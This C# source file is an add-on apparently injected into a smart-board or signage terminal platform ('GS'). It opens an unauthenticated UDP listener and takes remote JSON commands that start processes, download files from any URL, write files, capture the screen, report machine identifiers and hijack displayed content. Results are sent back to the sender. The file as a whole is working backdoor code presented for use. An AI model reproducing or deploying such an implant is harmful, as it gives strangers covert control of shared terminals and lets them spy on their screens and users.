using GS.Unitive.Framework.Core;
using Newtonsoft.Json;
using System;
using System.Net;
using System.Text;
using System.Threading;

namespace Cirno.ChinaGS.Injection.Temp
{
    public class Program : IAddonActivator
    {
        public const int PORT = 19260;

        public IAddonContext addonContext;
        public UdpListener udpListener;
        public InjectionInterface injection;
        public bool programStopping;

        public void Start(IAddonContext context)
        {
            this.addonContext = context;
            udpListener = new UdpListener(PORT);
            programStopping = false;

            try
            {
                this.injection = new InjectionInterface(addonContext, false);
            }
            catch (Exception ex)
            {
                this.addonContext.Logger.Error("[FATAL] CGSI Env Failed to instantiate essential classes.", null);
                return;
            }

            try
            {
                // 从 config.xml 加载宽高 务必检查配置文件是否正确!!
                double left = 1770.0;
                double top = 1060.0;

                string l_get, t_get;
                l_get = this.addonContext.DictionaryValue("base", "left");
                t_get = this.addonContext.DictionaryValue("base", "top");

                if (l_get != string.Empty && t_get != string.Empty)
                {
                    left = Convert.ToDouble(l_get);
                    top = Convert.ToDouble(t_get);
                }

                HoverText hoverText = new HoverText();
                Utils.AddGarnitureControl(addonContext, hoverText, left, top);

                this.injection.WriteLog("[CGSI Assembly] Successfully added garniture!");
            }
            catch (Exception ex)
            {
                this.injection.WriteLog("[CGSI Assembly] Cannot add garniture in Program.Start!!");
            }

            try
            {
                RegistBackgroundCommand();
                this.injection.WriteLog("[CGSI Assembly] Successfully registed background command!");
            }
            catch (Exception ex)
            {
                this.injection.WriteLog("[CGSI Assembly] Fail to regist background command!");
            }

            this.injection.WriteLog("[CGSI Assembly] CGSI loaded and listening @ port " +
                Convert.ToString(PORT) + "! Fuck GS!!");

            try
            {
                StartReceive();
            }
            catch (Exception)
            {
                this.injection.WriteLog("[CGSI Assembly] Failed to start thread!");
            }
        }

        public void RegistBackgroundCommand()
        {
            dynamic uiAddon = this.addonContext.
                GetFirstOrDefaultService("GS.Terminal.MainShell", "GS.Terminal.MainShell.Services.UIService");

            string msg = "测试跑马灯中……";
            uiAddon.RegistBackgroundCommand("19260", new Action(delegate
            {
                uiAddon.ShowPrompt(Utils.GetMachineWebPath(addonContext) + "; " +
                    Utils.GetMachineID(addonContext) + "; " + Utils.GetTerminalCode(addonContext), 10);
            }));

            uiAddon.RegistBackgroundCommand("19261", new Action(delegate
            {
                Utils.ShowPopup(addonContext, "ShadowLantern - LTP");
                injection.ShadowLanternLTP(msg, DateTime.Now.AddSeconds(1.0), DateTime.Now.AddSeconds(30.0));

                this.injection.WriteLog("[CGSI Test] LTP");
            }));

            uiAddon.RegistBackgroundCommand("10492", new Action(delegate
            {
                this.injection.AddMultiMediaVisualTemplate("test.json");
            }));

            uiAddon.RegistBackgroundCommand("10493", new Action(delegate
            {
                this.injection.AddMultiMediaVisualTemplate("C:\\Program Files (x86)\\SmartBoard_2.1.6.618[618beta5]\\cache\\BlockCache\\test.json");
            }));

            this.injection.WriteLog("[CGSI Assembly] Background command registered!");
        }

        public void Stop(IAddonContext context)
        {
            programStopping = true;

            try
            {
                udpListener.Dispose();
            }
            catch (Exception)
            {
            }
        }

        public void StartReceive()
        {
            new Thread(Receive)
            {
                IsBackground = true
            }.Start();
            this.injection.WriteLog("[CGSI Assembly] UDP listener thread stand by!");
        }

        public void Receive()
        {
            IPEndPoint remoteEndPoint = new IPEndPoint(IPAddress.Any, 0);
            while (!programStopping)
            {
                try
                {
                    byte[] recvBuffer = udpListener.udpClient.Receive(ref remoteEndPoint);

                    string ret = string.Empty;
                    if (recvBuffer.Length > 0)
                    {
                        string msg = Encoding.UTF8.GetString(recvBuffer);
                        this.injection.WriteLog("[CGSI Assembly] Received remote message.");
                        try
                        {
                            ret = ParseAndRun(msg);
                            this.injection.WriteLog("[CGSI Assembly] Command successfully executed.");
                        }
                        catch (Exception ex)
                        {
                            this.injection.WriteLog("[CGSI Assembly] Encountered exception while executing command." + "[msg]" + ex.Message + "[stacktrace]" + ex.StackTrace);
                        }

                        remoteEndPoint.Port = 19261; // 默认返回数据端口号！！
                        if (ret != string.Empty)
                        {
                            SendToRemoteAddr(remoteEndPoint, msg);
                        }
                        else
                        {
                            SendToRemoteAddr(remoteEndPoint, "Successfully executed command");
                        }
                        this.injection.WriteLog("[CGSI Assembly] Result sended to remote endpoint port " 
                            + remoteEndPoint.Port.ToString());
                    }
                }
                catch (Exception ex)
                {
                    this.injection.WriteLog("[CGSI Assembly] Network exception encountered. [errmsg]" + ex.Message + "[stacktrace]" + ex.StackTrace);
                }
            }
        }

        public void SendToRemoteAddr(IPEndPoint remoteEndPoint, string msg)
        {
            byte[] sendMsgBuffer = Encoding.UTF8.GetBytes(msg);
            _ = udpListener.udpClient.Send(sendMsgBuffer, sendMsgBuffer.Length, remoteEndPoint);
        }

        public string ParseAndRun(string msg)
        {
            string ret = string.Empty;
            RemoteCommand command = JsonConvert.DeserializeObject<RemoteCommand>(msg);

            DateTime start = Convert.ToDateTime(command.start_time);
            DateTime end = Convert.ToDateTime(command.end_time);

            switch (command.command_name.ToUpper())
            {
                case "SHADOWLANTERN":
                    this.injection.ShadowLantern(command.args, start, end);
                    break;

                case "SHADOWLANTERNLTP":
                    this.injection.ShadowLanternLTP(command.args, start, end);
                    break;

                case "FULLSCRIMG":
                    this.injection.FullScrMedia(command.args, "IMAGE", start, end);
                    break;

                case "FULLSCRVID":
                    this.injection.FullScrMedia(command.args, "VIDEO", start, end);
                    break;

                case "INTMEDIA":
                    this.injection.IntegritedMedia(command.args, start, end);
                    break;

                case "MACHINEID":
                    ret = Utils.GetMachineID(addonContext);
                    break;

                case "WEBPATH":
                    this.injection.ResetWebPath(command.args);
                    break;

                case "TERMINALCODE":
                    ret = Utils.GetTerminalCode(addonContext);
                    break;

                case "THEME":
                    Utils.SetTheme(addonContext, command.args);
                    break;

                case "SCRCAP":
                    ret = this.injection.GetScreenCapture(command.args);
                    break;

                case "POSTERTEMPLATE":
                    ret = this.injection.AddPosterTemplate(command.args).ToString();
                    break;

                case "POSTERTEMPLATEEX":
                    Guid guid = Guid.NewGuid();
                    Utils.CreateTimelineTask(addonContext, start, end, 1,
                        new Action<string, string>(delegate (string s, string id) {
                            guid = this.injection.AddPosterTemplate(command.args);
                        }),
                        new Action<string, string>(delegate (string s, string id) {
                            this.injection.RemovePosterTemplate(guid);
                        }),
                        "Cirno::PosterEx::" + Guid.NewGuid().ToString());
                    break;

                case "MEDIAVISUAL":
                    this.injection.AddMultiMediaVisualTemplate(command.args);
                    break;

                case "MEDIAVISUALEX":
                    Utils.CreateTimelineTask(addonContext, start, end, 1, 
                        new Action<string, string>(delegate (string s, string id) {
                            this.injection.AddMultiMediaVisualTemplate(command.args);
                        }),
                        null, "Cirno::Media::" + Guid.NewGuid().ToString());
                    break;

                case "PROCESS":
                    Utils.StartProcess(command.args, this.injection.GetCachePath());
                    break;

                case "PROCESSEX":
                    Utils.CreateTimelineTask(addonContext, start, end, 1,
                        new Action<string, string>(delegate (string s, string id)
                        {
                            Utils.StartProcess(command.args, this.injection.GetCachePath());
                        }),
                        null, "Cirno::Process::" + Guid.NewGuid().ToString());
                    break;

                case "WRITEJSON":
                    string[] args = command.args.Split(';');
                    string json_filename = args[0];
                    string json_b64 = args[1];

                    Utils.WriteJson(json_filename, json_b64, this.injection.GetCachePath());
                    break;

                case "DOWNLOADFILE":
                    string[] arg1 = command.args.Split(';');
                    string url = arg1[0];
                    string savename = arg1[1];

                    Utils.DownloadFile(url, savename, this.injection.GetCachePath());
                    break;

                case "DOWNLOADFILEEX":
                    string[] arg2 = command.args.Split(';');
                    string url1 = arg2[0];
                    string savename1 = arg2[1];

                    Utils.CreateTimelineTask(addonContext, start, end, 1,
                        new Action<string, string>(delegate (string s, string id)
                        {
                            Utils.DownloadFile(url1, savename1, this.injection.GetCachePath());
                        }),
                        null, "Cirno::DlFile::" + Guid.NewGuid().ToString());
                    break;

                case "CLRALLPOSTER":
                    this.injection.ClearAllPosterTemplate();
                    break;

                default:
                    this.injection.WriteLog("[CGSI Assembly] Cannot find command [" + command.command_name + "] !");
                    break;
            }
            return ret;
        }
    }

    class RemoteCommand
    {
        public string command_name;
        public string start_time;
        public string end_time;
        public string args;
    }
}
